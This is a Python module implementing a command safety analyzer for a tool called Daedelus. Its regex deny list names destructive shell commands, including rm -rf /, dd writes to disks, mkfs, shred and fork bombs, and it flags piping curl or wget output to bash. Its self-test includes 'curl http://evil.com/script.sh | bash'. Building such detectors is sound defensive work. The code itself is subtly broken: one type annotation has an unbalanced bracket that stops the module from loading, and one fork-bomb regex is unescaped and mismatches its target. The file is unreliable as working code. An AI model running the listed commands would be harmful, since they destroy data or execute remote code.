"""
Command safety analysis for Daedelus.

Analyzes commands for potentially dangerous operations and provides
safety warnings or blocks execution based on configuration.

Created by: orpheus497
"""

import logging
import re
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Pattern, Set

logger = logging.getLogger(__name__)


class SafetyLevel(Enum):
    """Safety levels for command analysis."""

    SAFE = "safe"  # Command is safe to execute
    WARNING = "warning"  # Command is potentially dangerous, warn user
    DANGEROUS = "dangerous"  # Command is dangerous, block by default
    BLOCKED = "blocked"  # Command is blocked by configuration


@dataclass
class DangerousPattern:
    """Definition of a dangerous command pattern."""

    pattern: str  # Regex pattern
    description: str  # Human-readable description
    level: SafetyLevel  # Danger level
    examples: List[str]  # Example dangerous commands


@dataclass
class SafetyReport:
    """Result of command safety analysis."""

    command: str  # Original command
    level: SafetyLevel  # Safety level
    warnings: List[str]  # List of warnings
    matched_patterns: List[DangerousPattern]  # Patterns that matched
    safe_to_execute: bool  # Whether command can be executed
    explanation: str  # Human-readable explanation


class SafetyAnalyzer:
    """
    Analyzes commands for safety issues.

    Features:
    - Pattern-based dangerous command detection
    - Configurable safety levels
    - User whitelist support
    - Detailed safety explanations
    """

    # Built-in dangerous patterns
    DANGEROUS_PATTERNS = [
        DangerousPattern(
            pattern=r"rm\s+(-[rf]+\s+)?/(?!home|tmp|var/tmp)",
            description="Recursive deletion from root filesystem",
            level=SafetyLevel.DANGEROUS,
            examples=["rm -rf /", "rm -rf /usr", "rm -rf /etc"],
        ),
        DangerousPattern(
            pattern=r"dd\s+.*of=/dev/(sd|nvme|vd)",
            description="Direct disk write (can destroy data)",
            level=SafetyLevel.DANGEROUS,
            examples=["dd if=/dev/zero of=/dev/sda", "dd if=image.iso of=/dev/sdb"],
        ),
        DangerousPattern(
            pattern=r"mkfs\.",
            description="Filesystem creation (erases data)",
            level=SafetyLevel.DANGEROUS,
            examples=["mkfs.ext4 /dev/sda1", "mkfs.xfs /dev/nvme0n1p1"],
        ),
        DangerousPattern(
            pattern=r"chmod\s+(-R\s+)?777",
            description="Setting world-writable permissions",
            level=SafetyLevel.WARNING,
            examples=["chmod 777 file.txt", "chmod -R 777 /var/www"],
        ),
        DangerousPattern(
            pattern=r":\(\)\{.*\|:&\};:",
            description="Fork bomb (will crash system)",
            level=SafetyLevel.DANGEROUS,
            examples=[":(){ :|:& };:"],
        ),
        DangerousPattern(
            pattern=r">\s*/dev/(sd|nvme|vd)[a-z]",
            description="Direct write to block device",
            level=SafetyLevel.DANGEROUS,
            examples=["> /dev/sda", "echo data > /dev/nvme0n1"],
        ),
        DangerousPattern(
            pattern=r"sudo\s+rm\s+-rf\s+/",
            description="Recursive root deletion with sudo",
            level=SafetyLevel.DANGEROUS,
            examples=["sudo rm -rf /", "sudo rm -rf /*"],
        ),
        DangerousPattern(
            pattern=r"curl\s+.*\|\s*(bash|sh)",
            description="Piping remote script directly to shell",
            level=SafetyLevel.WARNING,
            examples=["curl http://example.com/script.sh | bash"],
        ),
        DangerousPattern(
            pattern=r"wget\s+.*\|\s*(bash|sh)",
            description="Piping remote script directly to shell",
            level=SafetyLevel.WARNING,
            examples=["wget -O- http://example.com/script.sh | sh"],
        ),
        DangerousPattern(
            pattern=r"fdisk\s+/dev/",
            description="Disk partitioning (can destroy data)",
            level=SafetyLevel.WARNING,
            examples=["fdisk /dev/sda"],
        ),
        DangerousPattern(
            pattern=r"parted\s+/dev/",
            description="Disk partitioning (can destroy data)",
            level=SafetyLevel.WARNING,
            examples=["parted /dev/sda mklabel gpt"],
        ),
        DangerousPattern(
            pattern=r"wipefs\s+",
            description="Filesystem signature erasure",
            level=SafetyLevel.WARNING,
            examples=["wipefs -a /dev/sda1"],
        ),
        DangerousPattern(
            pattern=r"shred\s+",
            description="Secure file deletion (irrecoverable)",
            level=SafetyLevel.WARNING,
            examples=["shred -vfz -n 10 /dev/sda"],
        ),
        DangerousPattern(
            pattern=r":(){ :|: & };:",
            description="Fork bomb variant",
            level=SafetyLevel.DANGEROUS,
            examples=[":(){ :|: & };:"],
        ),
    ]

    # Commands that should always require confirmation
    CONFIRMATION_COMMANDS = {
        "rm",
        "dd",
        "mkfs",
        "fdisk",
        "parted",
        "wipefs",
        "shred",
        "format",
    }

    def __init__(
        self,
        enabled: bool = True,
        level: str = "warn",
        custom_patterns: Optional[List[Dict[str, str]]] = None,
        whitelist_patterns: Optional[List[str]]] = None,
    ) -> None:
        """
        Initialize safety analyzer.

        Args:
            enabled: Whether safety analysis is enabled
            level: Safety level (off, warn, block)
            custom_patterns: Optional custom dangerous patterns
            whitelist_patterns: Optional whitelist patterns
        """
        self.enabled = enabled
        self.level = level.lower()

        # Compile dangerous patterns
        self.patterns: List[DangerousPattern] = self.DANGEROUS_PATTERNS.copy()

        # Add custom patterns
        if custom_patterns:
            for p in custom_patterns:
                self.patterns.append(
                    DangerousPattern(
                        pattern=p["pattern"],
                        description=p.get("description", "Custom dangerous pattern"),
                        level=SafetyLevel.DANGEROUS,
                        examples=[],
                    )
                )

        # Compile whitelist
        self.whitelist: List[Pattern] = []
        if whitelist_patterns:
            for pattern in whitelist_patterns:
                try:
                    self.whitelist.append(re.compile(pattern, re.IGNORECASE))
                except re.error as e:
                    logger.warning(f"Invalid whitelist pattern '{pattern}': {e}")

        logger.info(f"Safety analyzer initialized (level={self.level}, enabled={self.enabled})")

    def analyze(self, command: str, context: Optional[Dict[str, str]] = None) -> SafetyReport:
        """
        Analyze a command for safety issues.

        Args:
            command: Command string to analyze
            context: Optional context (cwd, user, etc.)

        Returns:
            SafetyReport with analysis results
        """
        if not self.enabled:
            return SafetyReport(
                command=command,
                level=SafetyLevel.SAFE,
                warnings=[],
                matched_patterns=[],
                safe_to_execute=True,
                explanation="Safety analysis disabled",
            )

        # Check whitelist first
        if self._is_whitelisted(command):
            return SafetyReport(
                command=command,
                level=SafetyLevel.SAFE,
                warnings=["Command matches whitelist pattern"],
                matched_patterns=[],
                safe_to_execute=True,
                explanation="Command is whitelisted",
            )

        # Check against dangerous patterns
        matched_patterns: List[DangerousPattern] = []
        warnings: List[str] = []
        max_level = SafetyLevel.SAFE

        for pattern in self.patterns:
            try:
                if re.search(pattern.pattern, command, re.IGNORECASE):
                    matched_patterns.append(pattern)
                    warnings.append(f"{pattern.level.value.upper()}: {pattern.description}")

                    # Track highest danger level
                    if pattern.level == SafetyLevel.DANGEROUS:
                        max_level = SafetyLevel.DANGEROUS
                    elif pattern.level == SafetyLevel.WARNING and max_level == SafetyLevel.SAFE:
                        max_level = SafetyLevel.WARNING

            except re.error as e:
                logger.warning(f"Invalid pattern '{pattern.pattern}': {e}")

        # Check if command requires confirmation
        command_name = command.split()[0] if command.split() else ""
        if command_name in self.CONFIRMATION_COMMANDS and not matched_patterns:
            max_level = SafetyLevel.WARNING
            warnings.append(f"Command '{command_name}' requires confirmation")

        # Determine if safe to execute based on level setting
        safe_to_execute = True
        if self.level == "block" and max_level == SafetyLevel.DANGEROUS:
            safe_to_execute = False
            max_level = SafetyLevel.BLOCKED
        elif self.level == "warn" and max_level == SafetyLevel.DANGEROUS:
            warnings.insert(0, "⚠️  DANGEROUS command detected - proceed with caution")

        # Generate explanation
        explanation = self._generate_explanation(command, matched_patterns, max_level)

        return SafetyReport(
            command=command,
            level=max_level,
            warnings=warnings,
            matched_patterns=matched_patterns,
            safe_to_execute=safe_to_execute,
            explanation=explanation,
        )

    def _is_whitelisted(self, command: str) -> bool:
        """Check if command matches whitelist."""
        for pattern in self.whitelist:
            if pattern.search(command):
                return True
        return False

    def _generate_explanation(
        self,
        command: str,
        matched_patterns: List[DangerousPattern],
        level: SafetyLevel,
    ) -> str:
        """Generate human-readable explanation of safety analysis."""
        if level == SafetyLevel.SAFE:
            return "Command appears safe to execute"

        if level == SafetyLevel.BLOCKED:
            return (
                f"Command BLOCKED due to dangerous pattern(s). "
                f"Matched: {', '.join(p.description for p in matched_patterns)}"
            )

        if not matched_patterns:
            return "Command requires user confirmation"

        # Generate detailed explanation
        parts = [f"Command contains {len(matched_patterns)} potential issue(s):"]

        for i, pattern in enumerate(matched_patterns, 1):
            parts.append(f"\n{i}. {pattern.description}")
            if pattern.examples:
                parts.append(f"   Examples: {', '.join(pattern.examples[:2])}")

        parts.append("\n\nPlease verify this command before executing.")

        return "".join(parts)

    def get_statistics(self) -> Dict[str, int]:
        """
        Get statistics about loaded patterns.

        Returns:
            Dictionary of statistics
        """
        stats = {
            "total_patterns": len(self.patterns),
            "dangerous_patterns": sum(
                1 for p in self.patterns if p.level == SafetyLevel.DANGEROUS
            ),
            "warning_patterns": sum(1 for p in self.patterns if p.level == SafetyLevel.WARNING),
            "whitelist_patterns": len(self.whitelist),
            "enabled": int(self.enabled),
        }
        return stats


def load_safety_analyzer_from_config(config: Dict[str, any]) -> SafetyAnalyzer:
    """
    Load safety analyzer from configuration dictionary.

    Args:
        config: Configuration dictionary

    Returns:
        Configured SafetyAnalyzer instance
    """
    safety_config = config.get("safety", {})

    enabled = safety_config.get("enabled", True)
    level = safety_config.get("level", "warn")

    # Load custom patterns
    custom_patterns = []
    for pattern_str in safety_config.get("dangerous_patterns", []):
        custom_patterns.append(
            {"pattern": pattern_str, "description": f"Custom pattern: {pattern_str}"}
        )

    # Load whitelist
    whitelist = safety_config.get("whitelist_patterns", [])

    return SafetyAnalyzer(
        enabled=enabled,
        level=level,
        custom_patterns=custom_patterns,
        whitelist_patterns=whitelist,
    )


# Example usage
if __name__ == "__main__":
    # Test the safety analyzer
    analyzer = SafetyAnalyzer(enabled=True, level="warn")

    test_commands = [
        "ls -la",
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "chmod 777 file.txt",
        "git commit -m 'test'",
        "curl http://evil.com/script.sh | bash",
    ]

    print("Command Safety Analysis Test")
    print("=" * 70)

    for cmd in test_commands:
        report = analyzer.analyze(cmd)
        print(f"\nCommand: {cmd}")
        print(f"Level: {report.level.value.upper()}")
        print(f"Safe: {report.safe_to_execute}")
        if report.warnings:
            print(f"Warnings: {report.warnings}")
        print(f"Explanation: {report.explanation}")
        print("-" * 70)
